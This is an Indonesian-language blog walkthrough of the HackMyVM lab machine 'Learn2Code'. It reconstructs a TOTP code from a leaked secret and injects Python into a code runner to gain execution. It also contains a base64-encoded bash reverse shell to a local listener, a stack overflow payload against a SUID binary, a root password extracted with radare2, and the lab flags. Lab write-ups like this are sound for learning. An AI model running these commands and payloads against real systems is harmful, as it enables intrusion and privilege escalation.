---
layout: post
title: "HackMyVM: Learn2Code"
date: 2022-10-15
categories: hackmyvm 
tags: [php-code-authentication, bypass-python-sandbox, RCE, stack-based overflow, reversing]
---

Mesin dengan tingkat kesulitan **Medium** dan semua kasus yang berbau basic untuk pengenalan exploit development dan seterusnya. Tingkat privilege escalation yang tidak begitu sulit karena tinggal analisis dan extract string saja. Well, lumayan membuang-buang waktu juga sih karena saya tidak terbiasa dengan *pwn* hehe, karena soal ini saya mempelajari banyak hal dan menyukai exploit development!. Mari simak!

## Reconnaissance

Saved as variable.
```
victim=192.168.56.27
```

## Nmap Scanning
```bash
# Nmap 7.92 scan initiated Sat Oct  8 13:38:51 2022 as: nmap -vvv -p 80 -sCV -A -oN scan_tcp 192.168.56.27
Nmap scan report for 192.168.56.27
Host is up, received syn-ack (0.00043s latency).
Scanned at 2022-10-08 13:39:00 WIB for 6s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Access system
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  8 13:39:06 2022 -- 1 IP address (1 host up) scanned in 14.80 seconds

```
Port hanya 80 saja? tidak ada yang lain? Apache? Oke.

## 80 - static web

![image123213](https://i.postimg.cc/sfm6d9G9/image.png)

Dari sini saya berpikir untuk fuzzing codenya dengan mengirimkan data menggunakan metode POST request lalu menggunakan wordlist 6 digit dari _SecLists_. Dan saya berpikir akan kena dan langsung login tapi ternyata itu hanya membuang waktu saja.
```bash
╭─ via [machines/learn2code]
╰─ wfuzz -w /opt/SecLists/Fuzzing/6-digits-000000-999999.txt -d "action=check_code&code=FUZZ" -u http://$victim/ --hl 32

```
<img width="400" src="https://i0.kym-cdn.com/photos/images/facebook/000/029/118/29bc5tl.png">

## Whatweb results

![image](https://i.postimg.cc/CM6nD3pB/image.png)

JQuery? menarik.

## Nikto results

![image2](https://i.postimg.cc/pdhRw617/image.png)

ada directory indexing, apache default file. hmm menarik semua.

sebenarnya saya sempat scanning dengan **wapiti** tetapi tidak ada result yang menarik untuk diulas. dan juga saya sempat menjalankan **gobuster** untuk bruteforcing atau fuzzing directory tapi ternyata output yang ditampilkan sama saja seperti **nikto**.

## directory listing

di sini ada 3 folder, tetapi yang membuat saya tertarik itu ada 2 dan yang paling utama ialah folder *PHP*.

![image3](https://i.postimg.cc/gjkZHpNQ/image.png)


## exploiting

karena biasanya di bagian folder PHP ini bisa dapat banyak vulnerability yang bisa diinjeksi (menurut pengalaman) dan ditesting untuk masuk ke revshell ataupun bisa di-abuse seperti mendapatkan cookies untuk login, atau menambahkan RCE, dan semacamnya. Tapi kali ini jalan yang saya tempuh sedikit berbeda.

![image4](https://i.postimg.cc/QxC6XZhf/image.png)

well, **GoogleAuthenticator.php** itu ketika saya cari ternyata filenya ada *source code* di [github](https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php). nanti akan saya tamapakkan beberapa fungsi yang penting untuk dibahas. 

```php
╭─ via [machines/learn2code]
╰─ cat access.php.bak
<?php
        require_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta_GoogleAuthenticator();
        $secret = "S4I22IG3KHZIGQCJ";

        if ($_POST['action'] == 'check_code') {
                $code = $_POST['code'];
                $result = $ga->verifyCode($secret, $code, 1);

                if ($result) {
                        include('coder.php');
                } else {
                        echo "wrong";
                }
        }
?>%

```
Dari sini, sudah mengindikasikan bahwa kita harus mencari _parameter_ untuk variable _$code_ dengan metode POST request sebagai _argument included_. jadi mau tidak mau harus membuat beberapa modifikasi dari fungsi orisinilnya seperti di bawah ini.
```php
╭─ via [machines/learn2code]
╰─ cat testing.php
<?php
  require_once 'GoogleAuthenticator.php';
  $ga = new PHPGangsta_GoogleAuthenticator();

  $secret = "S4I22IG3KHZIGQCJ";
  $kodeNyaAnjing = $ga->getCode($secret);
  $checkResult = $ga->verifyCode($secret, $kodeNyaAnjing, 1);
  if ($checkResult) {
    echo $kodeNyaAnjing;
  }
  else
  {
    echo 'failed'; # code...
  }

?>

```
lalu saat saya jalankan, dan yap tinggal masukkan saja.
```bash
╭─ via [machines/learn2code]
╰─ php testing.php
991873%
```
## shell as www-data

Jadi ga tau kenapa saat saya ingin melihat responsive websitenya kembali dan memasukkan _generated code_ tersebut malah ga masuk-masuk, jadi saya menggunakan CLI untuk testing dan nanti saya akan menggunakan cookies sebagai pengganti _request data_ agar tetap saved login.

```bash
╭─ via [machines/learn2code]
╰─ php testing.php
772367%
╭─ via [machines/learn2code]
╰─ curl -vX POST 'http://192.168.56.27/includes/php/access.php' -d 'action=check_code&code=772367'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.56.27:80...
* Connected to 192.168.56.27 (192.168.56.27) port 80 (#0)
> POST /includes/php/access.php HTTP/1.1
> Host: 192.168.56.27
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 29
> Content-Type: application/x-www-form-urlencoded
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 15 Oct 2022 09:20:07 GMT
< Server: Apache/2.4.38 (Debian)
< Set-Cookie: PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1543
< Content-Type: text/html; charset=UTF-8
<
                <!DOCTYPE html>
                <HTML>
                        <head>
                                <title>Coding practise</title>

                                <!-- Configurations -->
                                <meta charset="utf-8">
                                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                                <meta name="viewport" content="width=device-width, initial-scale=1">

                                <!-- Styles -->
                                <link href="../includes/css/style.css" rel="stylesheet">
                                <link href="../includes/css/bootstrap.min.css" rel="stylesheet">

                                <!-- JavaScript -->
                                <script src="../includes/js/jquery-3.4.1.min.js"></script>
                                <script src="../includes/js/bootstrap.min.js"></script>
                                <script src="../includes/js/custom_lib.js"></script>
                                <script src="../includes/js/functions.js"></script>
                        </head>
                        <body>
                                <div class="container">
                                        <div class="row d-flex justify-content-center h-100">
                                                <div class="col-md-6 boxWrap">
                                                        <div class="container">
                                                                <div class="row">
                                                                        <div class="col-12">
                                                                                <label for="custom_code">Type your code:</label>
                                                                                <textarea class="form-control custom-code" id="custom_code" rows="10"></textarea>
                                                                        </div>
                                                                </div>
                                                                <div class="row">
                                                                        <div class="col-12">
                                                                                <button type="button" class="btn btn-primary btn-block" onclick="run_code();">Run code</button>
                                                                        </div>
                                                                </div>
                                                                <div class="row">
                                                                        <div class="col-12">
                                                                                <textarea class="form-control response-code" id="response_code" rows="10" disabled></textarea>
                                                                        </div>
                                                                </div>
                                                        </div>
                                                </div>
                                        </div>
                                </div>
                        </body>
                </HTML>
* Connection #0 to host 192.168.56.27 left intact
     
```
saya ulangi lagi dan mencoba untuk memasukkan ini ke dalam request data dengan POST method untuk dikirimkan ke url **/includes/php/access.php**. dan mengambil cookiesnya untuk injeksi *python sandboxes* yang terdapat pada situs tersebut.
```
╭─ via [machines/learn2code]
╰─ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&code=__import__('os').system('ls')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
GoogleAuthenticator.php
access.php
access.php.bak
coder.php
runcode.php
╭─ via [machines/learn2code]
╰─ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&code=__import__('os').system('id')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
seperti biasa kalo sudah seperti ini saya pasti waktunya untuk memasukkan _reverse shell_ !!
```bash
╭─ via [machines/learn2code]
╰─ echo "/bin/bash -i >& /dev/tcp/192.168.56.1/12345 0>&1" | base64 | cboard
╭─ via [machines/learn2code]
╰─ curl -sX POST 'http://192.168.56.27/includes/php/runcode.php' -d "action=run_code&code=__import__('os').system('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg== | base64 -d | bash')" -b "PHPSESSID=n6jrt811hte6ni7hetvj4vh6kp"

```
![image7](https://i.postimg.cc/0QqDXQYH/image.png)

## binary analyzing

kalau sudah masuk biasanya saya mencari versi kernel, jaringan network untuk melihat port apa saja yang sedang _listened_ atau _open_, atau melihat **SUID** binary yang bisa digunakan untuk injeksi dan kebetulan saya tidak kepikiran untuk menyalakan **LinPEAS** karena terlalu fokus dan sangat tertarik.

![image9](https://i.postimg.cc/qRd8RL77/image.png)

terdapat binary **MakeMeLearner** sebagai tersangka pertama. wait-wait-wait ketika saya eksekusi ia membutuh kan argumen, wow. ketika saya test untuk melihat _man help_-nya ternyata ini termasuk binary ELF.
```bash
www-data@Learn2Code:/var/www/html/includes/php$ /usr/bin/MakeMeLearner
/usr/bin/MakeMeLearner
MakeMeLearner: please specify an argument
www-data@Learn2Code:/var/www/html/includes/php$ /usr/bin/MakeMeLearner -h
/usr/bin/MakeMeLearner -h
Change the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000000
www-data@Learn2Code:/var/www/html/includes/php$ file /usr/bin/MakeMeLearner
file /usr/bin/MakeMeLearner
/usr/bin/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, for GNU/Linux 3.2.0, not stripped
```
kalau sudah seperti ini, saya harus memindahkan executable ini ke mesin local saya agar bisa saya debugging dan decompile dan melihat bagaimana executable ini berjalan.
```bash
www-data@Learn2Code:/var/www/html/includes/php$ cp /usr/bin/MakeMeLearner /dev/shm/.
</includes/php$ cp /usr/bin/MakeMeLearner /dev/shm/.
www-data@Learn2Code:/var/www/html/includes/php$ python3 -m http.server -d /dev/shm/
<l/includes/php$ python3 -m http.server -d /dev/shm/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.1 - - [15/Oct/2022 16:45:30] "GET /MakeMeLearner HTTP/1.1" 200 -

---local machine---

╭─ via [machines/learn2code]
╰─ wget http://$victim:8000/MakeMeLearner
--2022-10-15 16:44:02--  http://192.168.56.27:8000/MakeMeLearner
Connecting to 192.168.56.27:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16864 (16K) [application/octet-stream]
Saving to: ‘MakeMeLearner’

MakeMeLearner                       100%[=================================================================>]  16.47K  --.-KB/s    in 0s

2022-10-15 16:44:02 (32.6 MB/s) - ‘MakeMeLearner’ saved [16864/16864]
```

Yeah, sebelum itu saya lihat dulu kondisi strings dan imported simbols dari libraries yang dipakai pada executable ini.
```bash
╭─ via [machines/learn2code]
╰─ strings MakeMeLearner
/lib64/ld-linux-x86-64.so.2
setuid
strcpy
printf
system
__cxa_finalize
errx
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
=dcbau"
[]A\A]A^A_
please specify an argument
Change the 'modified' variable value to '0x61626364' to be a learner
/bin/bash
Try again, you got 0x%08x
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7452
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
errx@@GLIBC_2.2.5
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

```
terdapat string menarik seperti di bawah ini, saya yakin 4 awal kata di bawah adalah sebuah fungsi dan seterusnya itu adalah string yang mungkin sangat berguna untuk ditelisik lagi.
```
setuid
strcpy
printf
system

=dcbau"
[]A\A]A^A_
please specify an argument
Change the 'modified' variable value to '0x61626364' to be a learner
/bin/bash
Try again, you got 0x%08x
;*3$"
```
karena saya adalah manusia modern maka saya ingin kepastian yang lebih akurat lagi, jadi saya menjalankan `rabin2` untuk melihat lebih banyak informasi lagi terkait *executable* ini.
```bash
╭─ via [machines/learn2code]
╰─ rabin2 -zi MakeMeLearner
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable
2   0x00001030 GLOBAL FUNC       strcpy
3   0x00001040 GLOBAL FUNC       errx
4   0x00001050 GLOBAL FUNC       system
5   0x00001060 GLOBAL FUNC       printf
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00001070 GLOBAL FUNC       setgid
9   0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable
10  0x00001080 GLOBAL FUNC       setuid
11  0x00001090 WEAK   FUNC       __cxa_finalize

[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 27  28   .rodata ascii please specify an argument\n
1   0x00002028 0x00002028 68  69   .rodata ascii Change the 'modified' variable value to '0x61626364' to be a learner
2   0x0000206d 0x0000206d 9   10   .rodata ascii /bin/bash
3   0x00002077 0x00002077 26  27   .rodata ascii Try again, you got 0x%08x\n

```

dari sini bisa ditarik sebuah kesimpulan bahwa ini semacam `stack-based overflow` yang paling dasar karena terdapat keanehan pada address `0x00002028` dan `0x00002077` yang mana saya melihat dari keduanya terjadi karena suatu **conditional expression**. 

-

saya menganalisis bahwa `modified` adalah **variable** yang entah nilainya berapa dan harus digantikan dengan nilai `0x61626364` yang mana hasil stringnya adalah `dcba` dan jika hasilnya bisa mencapai nilai string tersebut maka kita akan dibawa elevasi ke user yaitu `learner` dengan rumusnya harus bisa mendekati `setuid` dan `setgid` untuk mengeksekusi shell `0x0000206d` dengan string `/bin/bash`. 

-

cukup ribet sih kalau ingin dijelaskan. 

tapi sebelum itu saya memastikan apakah learner adalah seorang user? 
```
www-data@Learn2Code:/var/www/html/includes/php$ grep -i sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
learner:x:1000:1000:learner,,,:/home/learner:/bin/bash
```
karena sudah terjawab, maka saya melanjutkan sisi yang lain. karena memang cuma ada 2 user doang.

lanjut lagi, saya beranjak untuk menjalankan radare dan melihat isi `dissassembled code` dari fungsi `main`.

```sh
╭─ via [machines/learn2code]
╰─ file MakeMeLearner                
MakeMeLearner: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, for GNU/Linux 3.2.0, not stripped
╭─ via [machines/learn2code]
╰─ checksec MakeMeLearner
[*] '/home/via/ctfs/hmv/machines/learn2code/MakeMeLearner'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled 
╭─ via [machines/learn2code]
╰─ gdb-pwndbg MakeMeLearner
Reading symbols from MakeMeLearner...
(No debugging symbols found in MakeMeLearner)
pwndbg: loaded 197 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> r $(python -c 'print("A"*80)')
Starting program: /home/via/ctfs/hmv/machines/learn2code/MakeMeLearner $(python -c 'print("A"*80)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Change the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x41414141
[Inferior 1 (process 273577) exited normally]
pwndbg>
```

batin saya "halah bajingan", ga tau kenapa saya suka menantang diri saya tapi suka batin sendiri gini. bukan karena kesel, tapi karena saya tipikal hal yang suka repot tapi suka nyesel sendiri kalo udah masuk yang repot-repot gini.

Oke saya jelaskan dulu bagaimana proses `executable` di atas untuk bisa ditebak jalan kerjanya. kalo gini saya lebih enak menjelaskannya lewat `pwndbg`.
jika ingin melihat lebih jelas maka saya menjalankan `binary` tersebut dengan menggunakan jumlah random byte `80` untuk menguji apakah huruf `A` ini nanti masuk ke target yang dimaksudkan dan ternyata sudah masuk ke `stack` yaitu dengan nilai `0x41414141`. 

jangan lupa untuk breakpoint di tempat yang penting!
```sh
pwndbg> disass main
Dump of assembler code for function main:
   0x0000555555555185 <+0>:	push   rbp
   0x0000555555555186 <+1>:	mov    rbp,rsp
   0x0000555555555189 <+4>:	sub    rsp,0x60
   0x000055555555518d <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000555555555190 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000555555555194 <+15>:	cmp    DWORD PTR [rbp-0x54],0x1
   0x0000555555555198 <+19>:	jne    0x5555555551b0 <main+43>
   0x000055555555519a <+21>:	lea    rsi,[rip+0xe67]        # 0x555555556008
   0x00005555555551a1 <+28>:	mov    edi,0x1
   0x00005555555551a6 <+33>:	mov    eax,0x0
   0x00005555555551ab <+38>:	call   0x555555555040 <errx@plt>
   0x00005555555551b0 <+43>:	lea    rdi,[rip+0xe71]        # 0x555555556028
   0x00005555555551b7 <+50>:	mov    eax,0x0
   0x00005555555551bc <+55>:	call   0x555555555060 <printf@plt>
   0x00005555555551c1 <+60>:	mov    DWORD PTR [rbp-0x4],0x0
   0x00005555555551c8 <+67>:	mov    rax,QWORD PTR [rbp-0x60]
   0x00005555555551cc <+71>:	add    rax,0x8
   0x00005555555551d0 <+75>:	mov    rdx,QWORD PTR [rax]
   0x00005555555551d3 <+78>:	lea    rax,[rbp-0x50]
   0x00005555555551d7 <+82>:	mov    rsi,rdx
   0x00005555555551da <+85>:	mov    rdi,rax
   0x00005555555551dd <+88>:	call   0x555555555030 <strcpy@plt>
   0x00005555555551e2 <+93>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00005555555551e5 <+96>:	cmp    eax,0x61626364
   0x00005555555551ea <+101>:	jne    0x55555555520e <main+137>
   0x00005555555551ec <+103>:	mov    edi,0x3e8
   0x00005555555551f1 <+108>:	call   0x555555555080 <setuid@plt>
   0x00005555555551f6 <+113>:	mov    edi,0x3e8
   0x00005555555551fb <+118>:	call   0x555555555070 <setgid@plt>
   0x0000555555555200 <+123>:	lea    rdi,[rip+0xe66]        # 0x55555555606d
   0x0000555555555207 <+130>:	call   0x555555555050 <system@plt>
   0x000055555555520c <+135>:	jmp    0x555555555224 <main+159>
   0x000055555555520e <+137>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555211 <+140>:	mov    esi,eax
   0x0000555555555213 <+142>:	lea    rdi,[rip+0xe5d]        # 0x555555556077
   0x000055555555521a <+149>:	mov    eax,0x0
   0x000055555555521f <+154>:	call   0x555555555060 <printf@plt>
   0x0000555555555224 <+159>:	mov    eax,0x0
   0x0000555555555229 <+164>:	leave  
   0x000055555555522a <+165>:	ret
pwndbg> b * 0x0000555555555185
Breakpoint 1 at 0x555555555185
pwndbg> b * 0x00005555555551bc
Breakpoint 2 at 0x5555555551bc
```
ketika saya jalankan, saya melihat ada `0x7fffffffdf08` sebagai nilai dari `RSP` pertama. bagaimana jika saya melanjutkan ke instruksi untuk ketiga kalinya maka saya bisa menebak kalau itu adalah ketetapan `RSP` yang terus menerus bergeser sampai ke bagian `stack low memory`. Dari sini saya ingin melihat berapa nilai byte dari `RBP` nantinya.
```
   0x555555555185 <main>       push   rbp -> RSP 0x7fffffffdf08
 ► 0x555555555186 <main+1>     mov    rbp, rsp -> RSP  0x7fffffffdf00 ◂— 0x2 & RBP have a same value.
```
Bisa diketahui `base` dari `RBP` adalah `8 bytes`. lalu pada instruksi selanjutnya? 
```
   0x555555555189 <main+4>     sub    rsp, 0x60 -> RSP 0x7fffffffdf00 
 ► 0x55555555518d <main+8>     mov    dword ptr [rbp - 0x54], edi -> *RSP  0x7fffffffdea0 ◂— 0x400000009 /* '\t' */
```
pada `0x555555555189` terdapat nilai `0x60` yang artinya `96` secara desimal dan itu akan disubstraksikan dengan `rsp`. karena saya penasaran berapa hasil dari nilai stack **X = `0x7fffffffdea0` - `0x7fffffffdf00`**
```
╭─ via [machines/learn2code]
╰─ rax2 0x7fffffffdf00 - 0x7fffffffdea0
140737488346880
140737488346784
╭─ via [machines/learn2code]
╰─ expr 140737488346880 - 140737488346784
96
```
maka nilai **X = 96**.<br/>
Well kalau begini artinya `RBP = 8` dan `RSP = 96`. 

Lalu saya melanjutkan lagi sampai pada `0x5555555551c8` karena instruksi `rax` berubah menjadi `0x44` yang arti desimalnya adalah `68`. yang jika dikurangi nilai `rbp = 88` ke `rax` maka, `20`.
```
pwndbg> x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
pwndbg> x/i $rsp
   0x7fffffffdea0:	sbb    al,ah
pwndbg> x/i $rip
=> 0x5555555551d3 <main+78>:	lea    rax,[rbp-0x50]
```
wait, saya malah bingung ini. kalau `rbp-0x50` adalah `80` terus untuk apa?. 
ataukah berarti `16 bytes` atau satu `stack frame` dari `0x7fffffffdea0` itu tidak dipakai? atau bagaimana?

karena saya orangnya bodoamatan maka saya akan melanjutkan dengan melihat ekstraksi sampai menemukan hal yang janggal.
```
 ► 0x5555555551dd <main+88>     call   strcpy@plt                <strcpy@plt>
        dest: 0x7fffffffdeb0 ◂— 0x0
        src: 0x7fffffffe31e ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```
di atas ini adalah kejanggalan saya di mana nilai `bunch of A's` adalah `src` ditetapkan pada address `0x7fffffffe31e`? lalu `dest` dengan address `0x7fffffffdeb0` memiliki nilai `0x0`, hadeh. yang tadinya kirain saya ekstraksinya bakalan waw ternyata sama saja.
```
pwndbg> x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
```
lihat? nilai `0xdeb0` masih `0x0`. ketika saya `next instruction` lagi, saya mendapatkan sesuatu yang menakjubkan pada ekstraksi dan `instruction` yang ada di `dissassembled code`,
```
 ► 0x5555555551e2 <main+93>     mov    eax, dword ptr [rbp - 4]
   0x5555555551e5 <main+96>     cmp    eax, 0x61626364 

pwndbg> x/30wx $rsp
0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
0x7fffffffdeb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdee0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdf00:	0x00000000	0x00000000	0xf7dd7290	0x00007fff
0x7fffffffdf10:	0xffffe000	0x00007fff
```
maka jika `0x50` adalah 80, saya memastikan bahwa tadi yang mana `rbp-0x50` lalu bertemu dengan nilai `rax` adalah `0x44` dan nilai asli `rbp` adalah `0x8` maka jawaban yang tepat untuk mengisi huhu :( itu berarti `4`. dan `0x50 - 0x4` = `76 bytes` untuk jumlah `A` dan + 4 dengan nilai `dcba` yang artinya `0x61626364` biar nilainya sama jika dikomparasi dan bisa mendapatkan shell dari `learner`.
```
0x55555555521f <main+154>           call   printf@plt                <printf@plt>
        format: 0x555555556077 ◂— 'Try again, you got 0x%08x\n'
        vararg: 0x41414141
```
see? failed. dan benar ini seperti sudah melebihi karena `vararg` itu jumlah `A` yang mempunyai nilai hex `0x41414141`.

<div style="padding-top: 5x"></div>

dengan `run $(python -c 'print("A"*76)')`. bagian stack `0x7fffffffdefc` mempunyai ekstraksi `0x00000000` yang mana ini harus dimodifikasi menjadi `dcba` agar nantinya melengkapi nilai keseluruhan buffer `80`.
```
pwndbg> x/4x 0x7fffffffdef0
0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x00000000 --> 0xdefc
pwndbg> 
```
## shell as learner
Dan jika saya coba.
```
www-data@Learn2Code:/dev/shm$ /usr/bin/MakeMeLearner $(python -c 'print("A"*76 + "dcba")')
learner@Learn2Code:/dev/shm$ cat /home/learner/user.txt
N1c3m0veMat3!
```
## privilege escalation

ini cuma decompile dan urusan bakal selesai.
```
learner@Learn2Code:/home/learner$ ls
MySecretPasswordVault  linpeas.sh  user.txt
learner@Learn2Code:/home/learner$
```
yap, saya telah menggunakan `linpeas.sh` tapi tetap tidak memunculkan jalan alternatif untuk eskalasi. dan di atas cuma ada `MySecretPasswordVault` executable yang harus ditelisik lagi huh. 

transfer *executable* itu ke local machine dan analyzing menggunakan `radare2`.
```
│           0x55ecd261c13d      488d05c40e00.  lea rax, str.NOI98hO    ; 0x55ecd261d008 ; "NOI98hO"
│           0x55ecd261c144      488945f8       mov qword [var_8h], rax
│           0x55ecd261c148      488d05c10e00.  lea rax, [0x55ecd261d010] ; "Ihj"
│           0x55ecd261c14f      488945f0       mov qword [var_10h], rax
│           0x55ecd261c153      488d05ba0e00.  lea rax, str.__Jj       ; 0x55ecd261d014 ; ")(Jj"
```
dan jika disusun akan menjadi `NOI98hOIhj)(Jj`.
```
learner@Learn2Code:/home/learner$ su root
Password: 
root@Learn2Code:/home/learner# cat /root/root.txt
Y0uG0TitbR0!
```

## References
* <https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10>
* <https://hacksland.net/protostar-stack0-tutorial>
* <https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes>
* <https://github.com/rosehgal/BinExp/blob/master/Lecture2/README.md>
* <https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php>
* <https://gist.github.com/sharpicx/c70f69eb8fe318bf8979b095a3a34012>
